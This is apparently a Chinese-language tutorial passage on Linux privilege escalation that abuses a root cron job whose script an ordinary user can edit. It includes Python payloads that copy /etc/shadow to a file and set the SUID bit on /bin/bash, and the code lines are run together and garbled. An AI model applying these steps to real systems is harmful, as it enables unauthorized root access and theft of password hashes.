利用思路

* * *

正常普通用户是无法修改root用户的计划任务的  

![](../Images/9ef0391c57f78f746874ac25a6cef7f8.png)

但我们查看/var/spool/cron/ 配置文件，发现root用户有个运行脚本的命令，每分钟运行test.py脚本

![](../Images/b000bddce68c9e836c0b3b13c198c01a.png)

如果linux配置了某项计划任务，该任务运行sh脚本、py脚本等其他脚本时，我们就可以尝试修改该脚本，添加一些系统命令。

![](../Images/54f1c65c6ba0acabbccd703ad1b055d1.png)

上面test.py脚本只是简单的输出，我们使用普通用户修改该文件，添加一个将密码输出到pass.txt文件的命令

*   
*   
*   
*   

```
#!/usr/bin/env python
import osos.system('cat /etc/shadow > /tmp/pass.txt')
```

![](../Images/be4e29b94d8f54fec9578d4471903f73.png)

可以看到成功使用root权限执行了所需要的命令，查看到root密文。

![](../Images/03efe6643ad781f731768de1d834901a.png)

计划任务配合SUID提权，将以root权限添加SUID给bash命令

*   
*   
*   
*   
*   
*   

```
#!/usr/bin/env python
import osimport sysos.system('cat /etc/shadow > pass.txt')os.system('chmod u+s /bin/bash')
```

我们就可以用SUID方式进行提权了。
